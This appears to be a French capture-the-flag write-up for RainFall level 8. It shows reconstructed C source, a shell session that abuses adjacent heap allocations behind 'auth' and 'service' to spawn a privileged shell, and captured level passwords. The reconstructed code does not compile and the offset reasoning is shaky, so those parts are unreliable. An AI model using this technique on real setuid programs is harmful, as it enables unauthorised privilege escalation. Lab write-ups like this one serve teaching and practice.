## Level 8

pass : `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`

## Sources :

```c
#include <stdio.h>

char	*auth = NULL;  // 0x08049aac
char	*service = NULL;  // 0x08049ab0

int	main() {
	while (1) {
		printf("%p, %p \n", auth, service);
		char	*in;  // exp+0x20
		if (fgets(in, 128, stdin) == 0)  // 0x80
			break;
		char *ptr = *in;
		char *auth_str = "auth ";  // ds:0x08049a80
		int i = 5;
		while (*ptr == *auth_str && i > 0) {
			ptr++;
			auth_str++;
			i--;
		}
		if (i == 0) {
			auth = malloc(4);
			*auth = '\0';
			i = 0;
			while (in[5 + i] != '\0') {
				i++;
			}
			i--;
			if (i <= 30) {  // 0x1e
				strcpy(auth, &in[5]);
			}
		}
		char *reset_str = "reset";  // 0x804881f
		int i = 5;
		ptr = *in;
		while (*ptr == *reset_str && i > 0) {
			ptr++;
			reset_str++;
			i--;
		}
		if (i == 0) {
			free(auth);
		}
		char *service_str = "service";  // 0x804881f
		int i = 6;
		ptr = *in;
		while (*ptr == *service_str && i > 0) {
			ptr++;
			service_str++;
			i--;
		}
		if (i == 0) {
			service = strdup(&in[7]);
		}
		char *login_str = "login";  // 0x804881f
		int i = 6;
		ptr = *in;
		while (*ptr == *login_str && i > 0) {
			ptr++;
			login_str++;
			i--;
		}
		if (i != 0) {
			continue;
		}
		if (auth[32] == '\0') {  // 0x20
			system("/bin/sh");
			continue;
		}
		fwrite("Password:\n", 1, 10, stdout);
	}
	return (0);
}
```

## Recherche :

Pour que l'on lance `system("/bin/sh");`, il faut que `auth[32] == '\0'`, mais comme on ne peut écrire que 30 caractères sur `auth`, on va passer par le fait que les deux variables `auth` et `service` sont contingentes, `0x08049ab0 - 0x08049aac = 4`, donc `auth[32] == service[28]`. On va donc mettre dans service une chaine de 28 caractères, qui sera directement complété par `\0` avec strdup.
Enfin, un coup de login et on est bon.

## Exploit

```shell
level8@RainFall:~$ ./level8
(nil), (nil)
auth test
0x804a008, (nil)
service 0123456789012345678901234567
0x804a008, 0x804a018
login
$ whoami
level9
$ cd ../level9
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$
```
